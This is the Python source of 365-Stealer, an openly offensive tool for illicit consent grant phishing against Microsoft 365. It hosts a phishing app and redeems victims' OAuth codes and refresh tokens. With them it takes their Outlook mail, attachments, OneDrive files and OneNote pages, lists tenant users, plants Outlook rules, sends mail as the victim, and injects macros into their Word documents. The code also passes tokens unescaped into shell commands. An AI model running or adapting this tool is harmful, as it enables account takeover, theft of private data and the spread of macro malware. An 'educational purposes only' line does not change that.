#!/usr/bin/env python3

# 365-Stealer is a tool used for performing Illicit Consent Grant attacks.
#
# Created by Raunak Parmar at Altered Security Pte Ltd.
# Copyright (C) Altered Security Pte Ltd.
# All rights reserved to Altered Security Pte Ltd.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
# This tool is meant for educational purposes only. 
# The creator takes no responsibility of any mis-use of this tool.

import requests, hashlib, json, re, os, sys, pathlib, base64, urllib, shutil, subprocess
import argparse, crayons, flask, threading, os.path, sqlite3, adal, logging, time
from hurry.filesize import size
from os import path
from pathlib import Path
from sqlite3 import Error  
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, jsonify
import ssl
    
parser = argparse.ArgumentParser()
parser.add_argument('--set-config',         help='Set 365-Stealer Configuration',              required=False,            action='store_true')
parser.add_argument('--get-config',         help='Get 365-Stealer Configuration',              required=False,            action='store_true')
parser.add_argument('--code',               help='Provide Authorization Code',                         required=False)
parser.add_argument('--token',              help='Provide Access Token',                               required=False)
parser.add_argument('--client-id',          help='Provide Application Client ID',                       required=False)
parser.add_argument('--client-secret',      help='Provide Application Client Secret',                  required=False)
parser.add_argument('--refresh-token',      help='Provide Refresh Token',                        required=False)
parser.add_argument('--token-path',         help='Provide Access Token file path',             required=False)
parser.add_argument('--refresh-all',        help='Steal all user\'s data again.',              required=False,            action='store_true')
parser.add_argument('--refresh-user',       help='Steal particular user\'s data again.(Provide EmailID)',required=False)
parser.add_argument('--redirect-url',       help='Redirect Url',                               required=False)
parser.add_argument('--database-path',      help='Provide Database Path',                      required=False)
parser.add_argument('--no-stealing',        help='Steal only Tokens',                          required=False,            action='store_true')
parser.add_argument('--upload',             help='Add files in victim\'s OneDrive(Provide File Path)',required=False)
parser.add_argument('--create-rules',       help='Provide json file containing outlook rules',required=False)
parser.add_argument('--send-mail',          help='Provide json file to send email', required=False)
parser.add_argument('--delete-all-data',    help='Delete all data from the database!',         required=False,            action='store_true')
parser.add_argument('--delete-user-data',   help='Delete specific user data from the database!',required=False)
parser.add_argument('--run-app',            help='Host the Phising App',                       required=False,            action='store_true')
parser.add_argument('--no-ssl',             help='Use http(port 80)',                          required=False,            action='store_true')
parser.add_argument('--port',               help='Provide custom port to Host the Phishing App',                         required=False)
parser.add_argument('--disable-logs',       help='Disable all http access logs',                       required=False,            action='store_true')
parser.add_argument('--custom-steal',       help='Steal specific data',                  required=False, nargs='+', choices=['listusers', 'checklicence', 'outlook', 'onedrive', 'onenote'])
parser.add_argument('--delay',              help='Delay the request by specifying time in seconds while stealing',       required=False)

arg = parser.parse_args()

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit()


def logo():
    
    print(crayons.yellow('''
      .oooo.       .ooo     oooooooo                                 
    .dP""Y88b    .88'      dP"""""""                                 
          ]8P'  d88'      d88888b.                                   
        <88b.  d888P"Ybo.     `Y88b                                  
         `88b. Y88[   ]88       ]88  8888888                         
    o.   .88P  `Y88   88P o.   .88P                                  
    `8bd88P'    `88bod8'  `8bd88P'
    
     .oooooo..o     .                       oooo                     
    d8P'    `Y8   .o8                       `888                     
    Y88bo.      .o888oo  .ooooo.   .oooo.    888   .ooooo.  oooo d8b 
     `"Y8888o.    888   d88' `88b `P  )88b   888  d88' `88b `888""8P 
         `"Y88b   888   888ooo888  .oP"888   888  888ooo888  888     
    oo     .d8P   888 . 888    .o d8(  888   888  888    .o  888     
    8""88888P'    "888" `Y8bod8P' `Y888""8o o888o `Y8bod8P' d888b    
________________________________________________________________________   
 Credit: o365-Attack-Toolkit                 Author: @trouble1_raunak    

 Github: https://github.com/alteredsecurity/365-Stealer

 ''', bold=True))
logo()

refresh_token = False
client_id     = False
client_secret = False

def create_connection(db_file):
    conn = None
    try:
        conn = sqlite3.connect(db_file)
    except Error as e:
        print(crayons.red("Error create_connection: " + e, bold=True))

    return conn

database = os.path.dirname(os.path.abspath(sys.argv[0])) + "/database.db"
if arg.database_path is not None:
    database = arg.database_path

databasepath = pathlib.Path(database)
if databasepath.exists() is False:
    print(crayons.yellow("[!] Database path " + database + " not exist, Creating a new one!", bold=True))

# create a database connection
conn = create_connection(database)
def createtables(conn):
    sql1 = '''CREATE TABLE IF NOT EXISTS "Attachments" (
            "id"	TEXT,
            "username"	TEXT,
            "data"	BLOB,
            "filename"	TEXT,
            "size"	TEXT,
            "file_data_md5"	TEXT UNIQUE
        );
        '''
        
    sql2 = '''CREATE TABLE IF NOT EXISTS "oneDrive" (
            "id"	TEXT UNIQUE,
            "username"	TEXT,
            "data"	BLOB,
            "filename"	TEXT,
            "file_data_md5"	TEXT UNIQUE
        );
        '''
        
    sql3 ='''CREATE TABLE IF NOT EXISTS "outlook" (
            "id"	INTEGER UNIQUE,
            "username"	TEXT,
            "Body"	TEXT,
            "Sender"	TEXT,
            "ToRecipients"	TEXT,
            "BccRecipients"	TEXT,
            "CcRecipients"	TEXT,
            "ReplyTo"	TEXT,
            "Subject"	TEXT,
            "Flag"	TEXT,
            "HasAttachments"	TEXT,
            "date"	TEXT
        );'''
    sql4 = '''CREATE TABLE IF NOT EXISTS "Allusers" (
            "displayName"	TEXT,
            "givenName"	TEXT,
            "jobTitle"	TEXT,
            "mail"	TEXT,
            "mobilePhone"	TEXT,
            "officeLocation"	TEXT,
            "preferredLanguage"	TEXT,
            "surname"	INTEGER,
            "userPrincipalName"	TEXT,
            "id"	TEXT UNIQUE
        );'''   
    sql5 = '''CREATE TABLE IF NOT EXISTS "Token" (
            "username"	TEXT UNIQUE,
            "refreshtoken"	TEXT,
            "clientId"	TEXT,
            "clientSecret"	TEXT,
            "redirectUrl" TEXT
        );'''
        
    sql6 = '''CREATE TABLE IF NOT EXISTS "Config" (
            "client_id"	TEXT,
            "client_secret"	TEXT,
            "redirect_url"	TEXT,
            "redirect_after_stealing"	TEXT,
            "macros_file_path"	TEXT,
            "extension_onedrive" TEXT,
            "delay" INTEGER,
            "ID"	INTEGER UNIQUE
        );'''
    sql6_1 = '''INSERT OR IGNORE INTO Config
                  (client_id, client_secret, 
                  redirect_after_stealing, macros_file_path,
                  macros_file_path, extension_onedrive, delay, ID)
                  VALUES ('', '', '', '', '', '', '', 1)'''
    try:
        cur = conn.cursor()
        cur.execute(sql1)
        cur.execute(sql2)
        cur.execute(sql3)
        cur.execute(sql4)
        cur.execute(sql5)
        cur.execute(sql6)
        cur.execute(sql6_1)
        conn.commit()
    except Exception as e:
        print(crayons.yellow("[!] Warning createtables: " + str(e), bold=True))
        
createtables(conn) 
def getConfig(conn):
    try:
        sql = """SELECT * from Config where ID = 1"""
                                  
        cur = conn.cursor()
        cur.execute(sql)
        rows = cur.fetchall()
        return  rows[0]
        
    except Exception as e:
        print(crayons.red("Error getConfig: " + str(e), bold=True))

def setConfig(conn, data):
    try:
        sql = '''UPDATE Config SET
                    client_id = ?,
                    client_secret = ?,
                    redirect_url = ?,
                    redirect_after_stealing = ?,
                    macros_file_path = ?,
                    extension_onedrive = ?,
                    delay = ?
                  '''
                  
        cur = conn.cursor()
        cur.execute(sql, data)
        conn.commit()
        print(crayons.green("[+] 365-Sealer Configuration set successfully!\n", bold=True))
        print(crayons.yellow("Client ID: " + data[0], bold=True))
        print(crayons.yellow("Client Secret: " + data[1], bold=True))
        print(crayons.yellow("Redirect Url: " + data[2], bold=True))
        print(crayons.yellow("Redirect Url After Stealing: " + data[3], bold=True))
        print(crayons.yellow("Macros File Path: " + data[4], bold=True))
        print(crayons.yellow("OneDrive Extensions: " + data[5], bold=True))
        print(crayons.yellow("Delay: " + str(data[6]), bold=True))
        
    except Exception as e:
        print(crayons.red("Error setConfig: " + str(e), bold=True))
        return False


regexUrl = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)


if arg.set_config is not False:
    print(crayons.green(" Welcome to 365-Stealer Configuration.\n", bold=True))
    client_id                = input(" Client ID ==> ").replace(" ", "")
    client_secret            = input(" Client Secret ==> ").replace(" ", "")
    redirect_url             = input(" Redirect Url ==> ").replace(" ", "")
    while re.match(regexUrl, redirect_url) is  None and redirect_url != '':
        print(crayons.red(" [-] Error: Invalid Url provided!", bold=True))
        redirect_url = input(" Redirect Url ==> ").replace(" ", "")
        
    redirect_after_stealing  = input(" Redirect Url After Stealing ==> ").replace(" ", "")
    if re.match(regexUrl, redirect_after_stealing) is  None or redirect_after_stealing == '':
        redirect_after_stealing = "/"

    macros_file_path         = input(" Macros File Path ==> ")
    while os.path.exists(macros_file_path) == False:
        if macros_file_path == "":
            break
        print(crayons.red(" [-] Error: File " + macros_file_path + " not exist!", bold=True))
        macros_file_path = input(" Macros File Path ==> ")
        
    extension_onedrive       = input(" OneDrive Extensions ==> ")
    delay                    = 0
        
    while delay == 0:
        try:
            delay = input(" Delay ==> ").replace(" ", "")
            delay = int(delay)
        except Exception as e:
            print(crayons.red(" [-] Error: Only Interger value excepted!", bold=True))
            delay = 0

    if isinstance(delay, str):
        delay = 1

    configs = (client_id, client_secret, redirect_url, redirect_after_stealing, macros_file_path, extension_onedrive, delay)
    setConfig(conn, configs)
    sys.exit()

configs = getConfig(conn)
   
CLIENTID              = configs[0]
CLIENTSECRET          = configs[1]
REDIRECTURL           = configs[2]
RedirectAfterStealing = configs[3]
macros                = configs[4]
extensions            = configs[5]
Delay                 = configs[6]

if arg.delay is not False and arg.delay is not None:
    Delay = int(arg.delay)

if arg.get_config is not False:
    print(crayons.green(" Your 365-Stealer Configuration.\n", bold=True))
    print(crayons.magenta(" Client ID: ", bold=True) + CLIENTID)
    print(crayons.magenta(" Client Secret: " , bold=True) + CLIENTSECRET)
    print(crayons.magenta(" Redirect Url: ", bold=True) + REDIRECTURL)
    print(crayons.magenta(" Redirect Url After Stealing: ", bold=True) + RedirectAfterStealing)
    print(crayons.magenta(" Macros File Path: ", bold=True) + macros)
    print(crayons.magenta(" OneDrive Extensions: ", bold=True) + extensions)
    print(crayons.magenta(" Delay: ", bold=True) + str(Delay))
    sys.exit()

if Delay == "":
    Delay = 0

if Delay > 0:
    print(crayons.blue('[!] Stealing processes delayed with ' + str(Delay) + ' seconds.', bold=True))

if extensions != '*':
    extensions = extensions.replace(" ", "")
    extensions = extensions.split(",")

if re.match(regexUrl, RedirectAfterStealing) is  None or RedirectAfterStealing == '':
    RedirectAfterStealing = "/"

if arg.custom_steal is not None:
    print(crayons.blue("[!] Swithed to custom stealing. " + str(arg.custom_steal), bold=True))
    
def main(refresh_token, client_id, client_secret):
    conn = create_connection(database)
    
    if refresh_token is None:
        refresh_token = False
        client_id     = False
        client_secret = False

    def insertoutlook(conn, data):
        sql = '''INSERT OR IGNORE INTO outlook(Id, username, body, Sender, ToRecipients, BccRecipients, CcRecipients,replyTo, subject, flag, hasAttachments, date)
                  VALUES(?,?,?,?,?,?,?,?,?,?,?,?) '''
        cur = conn.cursor()
        cur.execute(sql, data)
        conn.commit()
        cur.lastrowid

    def delete(conn):
        sql1 = 'DELETE FROM Allusers'
        sql2 = 'DELETE FROM Attachments'
        sql3 = 'DELETE FROM Token'
        sql4 = 'DELETE FROM onedrive'
        sql5 = 'DELETE FROM outlook'
        cur = conn.cursor()
        cur.execute(sql1)
        cur.execute(sql2)
        cur.execute(sql3)
        cur.execute(sql4)
        cur.execute(sql5)
        conn.commit()
     
    def delete_user(conn, user):
        sql1 = 'DELETE FROM Allusers WHERE userPrincipalName = ?'
        sql2 = 'DELETE FROM Attachments WHERE username = ?'
        sql3 = 'DELETE FROM Token WHERE username = ?'
        sql4 = 'DELETE FROM oneDrive WHERE username = ?'
        sql5 = 'DELETE FROM outlook WHERE username = ?'
        cur = conn.cursor()
        cur.execute(sql1, (user,))
        cur.execute(sql2, (user,))
        cur.execute(sql3, (user,))
        cur.execute(sql4, (user,))
        cur.execute(sql5, (user,))
        conn.commit()
        
        sql = 'DELETE FROM onedrive WHERE username = ?'
        cur = conn.cursor()
        cur.execute(sql, (user,))
        conn.commit() 
    def convertToBinaryData(filename):
        # Convert digital data to binary format
        with open(filename, 'rb') as file:
            blobData = file.read()
        return blobData
    
    def insertAttachment(conn ,Id , username, data, filename):
        try:
            md5_hash = hashlib.md5()
            sql = """INSERT OR REPLACE INTO Attachments
                                      (id, username, data, filename, size, file_data_md5) VALUES (?, ?, ?, ?, ?, ?)"""

            data = convertToBinaryData(data)
            filesize = str(size(len(data))) + str("B")
            md5_hash.update(data)
            data_digest = md5_hash.hexdigest()
            # Convert data into tuple format
            data_tuple = (Id, username, data, filename, filesize, data_digest)
            cursor = conn.cursor()
            cursor.execute(sql, data_tuple)
            conn.commit()
        except Exception as e:
            print(crayons.red("Error insertAttachment: " + str(e), bold=True))
    
    def insertBLOB(conn ,Id , username, data, filename):
        try:
            md5_hash = hashlib.md5()
            sql = """INSERT OR REPLACE INTO oneDrive
                                      (id, username, data, filename, file_data_md5) VALUES (?, ?, ?, ?, ?)"""

            data = convertToBinaryData(data)
            md5_hash.update(data)
            data_digest = md5_hash.hexdigest()
            # Convert data into tuple format
            data_tuple = (Id, username, data, filename, data_digest)
            cursor = conn.cursor()
            cursor.execute(sql, data_tuple)
            conn.commit()
        except Exception as e:
            print(crayons.red("Error insertBLOB: " + str(e), bold=True))
    
    def insertToken(conn, data):
        try:
            sql = """INSERT OR REPLACE INTO Token
                                      (username, refreshtoken, clientId, clientSecret, redirectUrl)
                                      VALUES (?, ?, ?, ?, ?)"""
                                      
            cur = conn.cursor()
            cur.execute(sql, data)
            conn.commit()
        except Exception as e:
            print(crayons.red("Error insertToken: " + str(e), bold=True))
    
    
    def insertuserlist(conn, data):
        try:
            sql = """INSERT OR REPLACE INTO Allusers
                                      (displayName,givenName, jobTitle, mail, mobilePhone, officeLocation, preferredLanguage, surname, userPrincipalName, id)
                                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
                                      
            cur = conn.cursor()
            cur.execute(sql, data)
            conn.commit()
        except Exception as e:
            print(crayons.red("Error insertuserlist: " + str(e), bold=True))

    if(arg.delete_all_data):
        delete(conn)
        print(crayons.green("[+] All data deleted!", bold=True))
        exit()
        
    if(arg.delete_user_data):
        delete_user(conn, arg.delete_user_data)
        print(crayons.green("[+] User's data deleted!", bold=True))
        exit()

    if arg.refresh_token is not None or arg.code is not None:
        if arg.client_id == None or arg.client_secret == None:
            if arg.refresh_all is False:
                print(crayons.red('[!] ClientId and clientSecret Required', bold=True))
            exit()
        client_id = arg.client_id
        client_secret = arg.client_secret   
        refresh_token = arg.refresh_token


    if refresh_token is not None and refresh_token is not False:
        
        url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
        
        auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
        try:
            response = auth_context.acquire_token_with_refresh_token(refresh_token, client_id, 'https://graph.microsoft.com/', client_secret)
        except Exception as e:
            try:
                print(crayons.red("Error: " + response.json()['error']['message'], bold=True))
            except:
                print(crayons.red("Error: " + str(e), bold=True))
            return        

        try:
            refresh_token = response['refreshToken']
            access_token = response['accessToken']
        except:
            if arg.refresh_all is False:
                print(crayons.red(json.loads(response.text)['error_description'], bold=True))
            exit()
        token = "Bearer " + access_token
        response = requests.get(" https://graph.microsoft.com/v1.0/me/", headers={"Authorization":token})


    if arg.code is not None and arg.redirect_url is not None:
        url = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'
        
        auth_context = adal.AuthenticationContext('https://login.microsoftonline.com/common', api_version=None)
        
        response = auth_context.acquire_token_with_authorization_code(
        arg.code, arg.redirect_url, 'https://graph.microsoft.com/', client_id, client_secret)
        
        try:
            refresh_token = response['refreshToken']
            access_token = response['accessToken']
        except:
            if arg.refresh_all is False:
                print(crayons.red("[-] " + json.loads(response.text)['error_description'], bold=True))
            exit()
        
        token = "Bearer " + access_token
        response = requests.get(" https://graph.microsoft.com/v1.0/me/", headers={"Authorization":token})

        
    if arg.token is not None:
        access_token = arg.token
        token = "Bearer " + arg.token
        response = requests.get(" https://graph.microsoft.com/v1.0/me/", headers={"Authorization":token})

    if arg.token_path is not None:
        try:
            with open(arg.token_path, 'r') as f:
                access_token =  str(f.readline())
                access_token =  access_token.replace("\n", "")
        except IOError:
            if arg.refresh_all is False:
                print(crayons.red("[-] File "+arg.token_path+" not accessible", bold=True))
            exit()
        token = "Bearer " + access_token
        response = requests.get(" https://graph.microsoft.com/v1.0/me/", headers={"Authorization":token})
        
        
    try:
        victimEmail = (json.loads(response.text)['userPrincipalName'])
        print(crayons.green("[+] " + victimEmail + " incoming!", bold=True))
        currentPath = os.path.dirname(os.path.abspath(sys.argv[0]))
    except:	
        if arg.refresh_all is False:
            print(crayons.red('[-] Looks like token has been expired or an invalid provided', bold=True))
        exit()
    try:        
        if os.path.isdir(currentPath + '/yourVictims') == False:
            os.mkdir(currentPath+'/yourVictims')

        folder = currentPath +'/yourVictims/' + victimEmail
    except Exception as e:
        if arg.refresh_all is False:
            print(crayons.red('[-] Error: ' + str(e) , bold=True))
        exit()
    
    
    if refresh_token is not None and refresh_token is not False:
        data = (victimEmail, refresh_token, client_id, client_secret, arg.redirect_url)
        insertToken(conn, data)

    try:
        os.mkdir(folder)
    except:
        pass
        
    os.system("echo "+ access_token + " > " + folder + "/access_token.txt")
        
    if client_id != False and client_secret != False:
        os.system("echo ClientID = "+ client_id + " > " + folder + "/App_config.txt")
        os.system("echo ClientSecret = "+ client_secret + " >> " + folder + "/App_config.txt")
        os.system("echo RedirectUrl = "+ REDIRECTURL + " >> " + folder + "/App_config.txt")


    if refresh_token != False:
        os.system("echo "+ refresh_token + " > " + folder + "/refresh_token.txt")


    def checkLicence():
        time.sleep(Delay)
        response = requests.get("https://graph.microsoft.com/v1.0/me/drive", headers={"Authorization":token})
        if response.status_code != 200:
            if arg.refresh_all is False:
                print(crayons.yellow("[!] Looks like Victim " + victimEmail + " doesn't have office365 Licence!", bold=True))
                exit()
        print(crayons.green("[+] Victim " + victimEmail + " have office365 Licence!", bold=True))    

    def createRules(rules):
        time.sleep(Delay)
        response = requests.get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", headers={"Authorization":token}).json()
        value = 0
        while value >= 0:
            try:
                name = response['value'][value]['displayName']
                if name == json.loads(rules)['displayName']:
                    ruleId = response['value'][value]['id']
                    time.sleep(Delay)
                    delete = requests.delete("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/"+ruleId, headers={"Authorization":token})
            except:
                break  
            value = value + 1
            
        time.sleep(Delay)    
        response = requests.post("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules", headers={"Authorization":token, "Content-Type": "application/json"}, data = rules)
        if response.status_code == 201:
            if arg.refresh_all is False:
                print(crayons.green('[+] Outlook rules created', bold=True))

        else:
            if arg.refresh_all is False:
                print(crayons.red('[-] Rules not created', bold=True))
                print(crayons.red('Error: ' + response.json()['error']['message'], bold=True))

        
    def createmacros(docxfile,itemId,name):
        vbs = '''
            Dim wdApp
            Set wdApp = CreateObject("Word.Application")
            wdApp.Documents.Open("[docxfile]")
            wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "[macros]"
            wdApp.Documents(1).SaveAs2 "[output]", 0
            wdApp.Quit
        '''
        output = docxfile.replace(".docx", ".doc")
        vbs = vbs.replace("[docxfile]", docxfile)
        vbs = vbs.replace("[macros]", macros)
        vbs = vbs.replace("[output]", output)
        
        f = open("..\\temp.vbs", "w")
        f.write(vbs)
        f.close()
        
        os.system("cscript ..\\temp.vbs")
        path = (output).replace("\\","/")
        try:
            f = open(path, "r", errors='ignore')
            content = f.read()
            
        except Exception as e:
            print(crayons.red("Error createmacros:" + e, bold=True))

        name = name.replace(".docx",".doc")
        data = '{ "name": "[name]" }'
        data = data.replace("[name]", name)
        time.sleep(Delay)
        response = requests.patch("https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId, headers={"Authorization":token,"Content-Type":"application/json"}, data = data)
        
        if response.status_code == 200:
            if arg.refresh_all is False:
                print(crayons.green("[+] File renamed to .doc!", bold=True))
        else:
            if arg.refresh_all is False:
                print(crayons.red("[-] File not renamed!", bold=True))         

        with open(path, 'rb') as content:
            time.sleep(Delay)
            response = requests.put(" https://graph.microsoft.com/v1.0/me/drive/items/"+ itemId +"/content", headers={"Authorization":token, "Content-Type":"application/vnd.openxmlformats-officedocument.wordprocessingml.document"}, data = content)

        if response.status_code == 200:
            if arg.refresh_all is False:
                print(crayons.green("[+] Macros successfully injected!", bold=True))
        else:
            if arg.refresh_all is False:
                print(crayons.red("[-] Macros not injected", bold=True))

    def onedrive():
        time.sleep(Delay)
        response = requests.get("https://graph.microsoft.com/v1.0/me/drive/root/children", headers={"Authorization":token})
        if response.status_code == 401:
            if arg.refresh_all is False:
                print(crayons.red("[-] Access token doesn't have access for OneDrive", bold=True))
                return
        time.sleep(Delay)
        response = requests.get("https://graph.microsoft.com/v1.0/me/drive/root/children", headers={"Authorization":token}).json()
        try:
            response['value'][0]['id']
        except:
            if arg.refresh_all is False:
                print(crayons.yellow('[!] OneDrive is Empty or accessToken has no rights on it!', bold=True))
            return
            
        value = 0

        while value >= 0:
            try:
                url = response['value'][value]['@microsoft.graph.downloadUrl']
                name = response['value'][value]['name']
                itemId = response['value'][value]['id']     
                filename , extension = os.path.splitext(name)
                extension = extension.replace(".", '')
                filePath = folder + '/onedrive/'+ name
                try:
                    os.mkdir(folder + '/onedrive')
                except Exception as e:
                    pass
                    
                if extension in extensions or extensions == '*':
                    if arg.refresh_all is False:
                        print(crayons.yellow('[!] Retrieving OneDrive Files', bold=True))  
                        
                    time.sleep(Delay)
                    r = requests.get(url, allow_redirects=True)
                    open(filePath, 'wb').write(r.content)
                    insertBLOB(conn, itemId, victimEmail, filePath, name)


                    if arg.refresh_all is False:
                        print(crayons.green(name + ' Downloaded!\n', bold=True))
     
                if name.endswith('.docx') == True:
                    docxfile = folder + '/onedrive/'+ name
                    if os.path.isfile(macros):
                        createmacros(docxfile,itemId,name)
                    else:
                        if arg.refresh_all is False:
                            print(crayons.red("[-] Macros file not found", bold=True))
                            
                        
            except Exception as e:
                if "list index out of range" in str(e):
                    break
                pass

            value = value + 1
        if arg.refresh_all is False:
            print(crayons.yellow('[+] Onedrive Done', bold=True))

    def onenote():
        time.sleep(Delay)
        response = requests.get(" https://graph.microsoft.com/v1.0/me/onenote/pages/", headers={"Authorization":token})
        if response.status_code == 401:
            if arg.refresh_all is False:
                print(crayons.red("[-] Access token doesn't have access for OneNote", bold=True))
                return
        time.sleep(Delay)
        response = requests.get(" https://graph.microsoft.com/v1.0/me/onenote/pages/", headers={"Authorization":token}).json()
        try:
            response['value'][0]['contentUrl']
        except:
            if arg.refresh_all is False:
                print(crayons.yellow('[!] OneNote is Empty or accessToken has no rights on it!', bold=True))
            return
            
        value = 0
        while value >= 0:
            try:
                if arg.refresh_all is False:
                    print(crayons.magenta("[!] Downloading OneNote files!", bold=True))
                time.sleep(Delay)
                url = response['value'][value]['contentUrl']
                data = requests.get(url, headers={"Authorization":token})
                data = data.text
                name = response['value'][value]['title'] + '.html'
                try:
                    os.mkdir(folder + '/onenote')
                except:
                    pass
                f = open(folder +'/onenote/'+ name, "w")
                f.write(data)
                f.close()
                if arg.refresh_all is False:
                    print(crayons.magenta(name + " Downloaded!\r\n", bold=True))
            except Exception as e:
                    break  
                
            value = value + 1
        if arg.refresh_all is False:
            print(crayons.magenta('[+] OneNote Done', bold=True))
            

    def attachments(Id,HasAttachments):
        if HasAttachments == True:
            time.sleep(Delay)
            response = requests.get(" https://graph.microsoft.com/v1.0/me/mailfolders/inbox/messages/"   + Id + "/attachments", headers={"Authorization":token}).json()
            value1 = 0
            if arg.refresh_all is False:
                print(crayons.cyan('\n[!] Retrieving Attachments', bold=True))
            while (value1 >= 0):
                try:
                    Attachment_name = response['value'][value1]['name']
                    attachmentPath = folder +'/Attachments/'+ Attachment_name
                    head, tail = os.path.split(attachmentPath)
                    if tail.lower() == "index.php":
                        Attachment_name = Attachment_name + ".txt"
                    if arg.refresh_all is False:
                        print(crayons.cyan(Attachment_name + " Downloaded!", bold=True))
                    extension = (pathlib.Path(Attachment_name).suffix)
                    Content = base64.b64decode((response['value'][value1]['contentBytes']))
                    try:
                        os.mkdir(folder +'/Attachments')
                    except:
                        pass    
                    f = open(folder +'/Attachments/'+ Attachment_name, "wb")
                    f.write(Content)
                    f.close()
                    insertAttachment(conn, Id, victimEmail, attachmentPath, tail)
                    
                except:
                    break
                value1 = value1 + 1
            
    def outlook():
        response = (requests.get(" https://graph.microsoft.com/v1.0/me/mailfolders/inbox/messages?$top=999", headers={"Authorization":token})).json()
        value = 0
        while (value >= 0):
            
            try:
                Body =      (response['value'][value]['body']['content'])
                From =          (response['value'][value]['from']['emailAddress']['address'])
                ToRecipients =  (response['value'][value]['toRecipients'])
                CcRecipients_og =  (response['value'][value]['ccRecipients'])
                CcRecipients = 'CcRecipients: ' + str(CcRecipients_og) + '\n' +  '<br>'
                
                BccRecipients_og = (response['value'][value]['bccRecipients'])
                BccRecipients = 'BccRecipients: ' + str(BccRecipients_og) + '\n' + '<br>'
                
                ReplyTo_og =       (response['value'][value]['replyTo'])
                ReplyTo =      'ReplyTo: ' + str(ReplyTo_og) + '\n' + '<br>'
                
                sentDateTime = (response['value'][value]['sentDateTime'])
                Subject =       (response['value'][value]['subject'])
                Flag =          (response['value'][value]['flag']['flagStatus'])
                HasAttachments =(response['value'][value]['hasAttachments'])
                Id =(response['value'][value]['id'])

                if CcRecipients == []:
                    CcRecipients = ''
                if BccRecipients == '':
                    BccRecipients = ''
                
                emailAddresscount = 0
                newRecipients = ""
                
                while 1 == 1:
                    try:
                        Recipients = ToRecipients[emailAddresscount]['emailAddress']['address']
                        emailAddresscount = emailAddresscount + 1
                        newRecipients = newRecipients + ", " + Recipients
                    except:
                        break

                ToRecipients = newRecipients[2:]
                value1 = value + 1
                result = ('<div style="width:80%; padding:10px; margin: 0 auto; background-color:#ffd5d5">' +
                        str(value1) + '.' +
                        '<b>Subject:'+str(Subject)+'</b>'+
                        '<b>From:&emsp;</b> ' + str(From) + '\n' + '<br>'+
                        '&emsp;&emsp; ToRecipients: ' + str(ToRecipients) + '\n' + '<br>' +
                        '&emsp;&emsp; '+ CcRecipients +
                        '&emsp;&emsp; '+ BccRecipients +
                        '&emsp;&emsp; '+ ReplyTo +
                        '&emsp;&emsp; Flag: ' + str(Flag) + '\n' + '<br>'+
                        '&emsp;&emsp; HasAttachments: ' + str(HasAttachments) + '\n' +  '<br>'+
                        '</div>'+
                        '<div style="width:80%; padding:10px; margin: 0 auto; background-color:#e2fad7">' + '<br>'+
                        str(Body) +'\r\n\r\n' + '<br>'+
                        '</div>' + 
                        '<hr width=100%  align=left>'
                        )

                attachments(Id,HasAttachments)
                
                sqldata = (Id,victimEmail, str(Body), From, str(ToRecipients), str(CcRecipients_og), str(BccRecipients_og), str(ReplyTo_og), Subject, Flag, HasAttachments, str(sentDateTime))
                insertoutlook(conn, sqldata)
                    
                try:    
                    os.mkdir(folder +'/outlook')
                except:
                    pass

                
                f = open(folder +'/outlook/all_mails.html', "a",  encoding="utf-8")
                f.write(result)
                f.close()
                
            except Exception as e:
                try:
                    if arg.refresh_all is False:
                        print(crayons.red("[-] Outlook Error: " + response['error']['message'], bold=True))
                except:
                    pass
                break
                
            value = value + 1    

    def listusers():
        response = (requests.get(" https://graph.microsoft.com/v1.0/users?$top=999", headers={"Authorization":token}))
        if response.status_code == 403:
            if arg.refresh_all is False:
                print(crayons.yellow("[!] Victim's token doesn't have permission to list users!", bold=True))
            return
        response = response.json()

        value = 0
        while (1 == 1):
            try:
                displayName =      (response['value'][value]['displayName'])
                givenName =      (response['value'][value]['givenName'])
                jobTitle =      (response['value'][value]['jobTitle'])
                mail =      (response['value'][value]['mail'])
                mobilePhone =      (response['value'][value]['mobilePhone'])
                officeLocation =      (response['value'][value]['officeLocation'])
                preferredLanguage =      (response['value'][value]['preferredLanguage'])
                surname =      (response['value'][value]['surname'])
                userPrincipalName =      (response['value'][value]['userPrincipalName'])
                Id =      (response['value'][value]['id'])
                
                data = (displayName,givenName, jobTitle, mail, mobilePhone, officeLocation, preferredLanguage, surname, userPrincipalName, Id)
                insertuserlist(conn, data)
                value = value + 1
            except Exception as e:
                break
        if arg.refresh_all is False:
            print(crayons.green("[+] All user's in tenant saved!", bold=True))    
        
    def sendmail(mail, fromuser):
        try:
            to = json.loads(mail)
            to = to['message']['toRecipients'][0]['emailAddress']['address']
        except Exception as e:
            print(crayons.red("[-] Error in json body: " + str(e)))
            return
   
        url = "https://graph.microsoft.com/v1.0/me/sendMail/"
        header = {"Authorization": token, "Content-type":"application/json"}
        response = requests.post(url, headers=header, data=mail)
        status = response.status_code
        
        if status == 202:
        
            msg = '[+] Mail sent from user ' + fromuser + " to " + str(to)
            
            if arg.refresh_all is False:
           	    print(crayons.green(msg, bold=True))
        else:
            msg  = '[-] Mail not sent!'        	  
            if arg.refresh_all is False:
                print(crayons.red(msg, bold=True))            
                print(crayons.red("Error: " + response.json()['error']['message'], bold=True))
        
